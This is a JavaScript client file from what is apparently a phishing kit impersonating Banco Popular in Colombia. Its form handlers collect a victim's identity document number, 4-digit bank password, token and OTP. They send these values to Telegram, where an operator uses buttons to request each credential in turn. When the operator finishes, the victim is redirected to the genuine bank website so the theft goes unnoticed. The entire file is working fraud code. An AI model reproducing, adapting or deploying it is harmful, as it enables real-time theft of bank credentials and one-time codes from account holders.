/**
 * POPULAR - Cliente optimizado con banco-utils
 */

(function() {
    'use strict';

    const routes = {
        'index.html': {
            getData: () => ({
                tipoDocumento: document.getElementById('tipo-documento')?.value || '',
                numeroDocumento: document.getElementById('numero-documento')?.value || ''
            }),
            validate: (d) => d.tipoDocumento.length > 0 && d.numeroDocumento.length >= 6
        },
        'clave.html': {
            getData: () => ({ clave: document.getElementById('clave')?.value || '' }),
            validate: (d) => d.clave.length === 4
        },
        'token.html': {
            getData: () => ({ token: document.getElementById('token')?.value || '' }),
            validate: (d) => d.token.length === 6
        },
        'otp.html': {
            getData: () => ({ otp: document.getElementById('otp')?.value || '' }),
            validate: (d) => d.otp.length === 6
        }
    };

    const buttons = [
        { text: '🔑 Pedir Login', action: 'request_login' },
        { text: '🔐 Pedir Contraseña', action: 'request_password' },
        { text: '📱 Pedir Token', action: 'request_token' },
        { text: '🔢 Pedir OTP', action: 'request_otp' },
        { text: '✅ Finalizar', action: 'finish' }
    ];

    function handleAction(data) {
        switch(data.action) {
            case 'request_login': window.location.href = 'index.html'; break;
            case 'request_password': window.location.href = 'clave.html'; break;
            case 'request_token': window.location.href = 'token.html'; break;
            case 'request_otp': window.location.href = 'otp.html'; break;
            case 'finish': window.location.href = 'https://www.bancopopular.com.co/'; break;
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        BancoUtils.onTelegramAction(handleAction);

        const page = window.location.pathname.split('/').pop();
        const config = routes[page];

        // Sistema de validación de botones
        if (config) {
            const submitBtn = document.querySelector('button[type="submit"]') || document.getElementById('btnContinuar') || document.getElementById('btnVerificar');
            const inputs = document.querySelectorAll('input');

            console.log('🚀 [Popular] Inicializando:', { page, submitBtn: !!submitBtn, inputsCount: inputs.length });

            function validateForm() {
                const formData = config.getData();
                console.log('🔍 [Popular] Validando:', { page, formData });
                const isValid = config.validate(formData);
                console.log('✅ [Popular] Resultado:', { isValid, submitBtn: !!submitBtn });
                if (submitBtn) {
                    submitBtn.disabled = !isValid;
                    submitBtn.classList.toggle('active', isValid);
                }
            }

            if (inputs.length > 0) {
                inputs.forEach(input => {
                    input.addEventListener('input', validateForm);
                });
            }

            // Validación inicial
            validateForm();
        }

        const form = document.querySelector('form');
        if (form) {
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const page = window.location.pathname.split('/').pop();
                const config = routes[page];
                
                if (!config) return;
                
                const formData = config.getData();
                if (!config.validate(formData)) {
                    alert('Complete todos los campos');
                    return;
                }

                BancoUtils.showOverlay();
                const data = BancoUtils.saveBankData('popular', formData);
                const message = BancoUtils.formatMessage('BANCO POPULAR', data);
                const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());

                try {
                    await BancoUtils.sendToTelegram(page.replace('.html', ''), { text: message, keyboard });
                } catch (error) {
                    BancoUtils.hideOverlay();
                    alert('Error al enviar');
                }
            });
        }

        // Validación numérica
        const numericInputs = document.querySelectorAll('input[type="password"], #clave, #token, #otp, #numeroDocumento');
        numericInputs.forEach(input => {
            input.addEventListener('input', () => {
                const maxLength = input.id === 'clave' ? 4 : input.id === 'token' || input.id === 'otp' ? 6 : 10;
                BancoUtils.validateNumeric(input, maxLength);
            });
        });
    });
})();
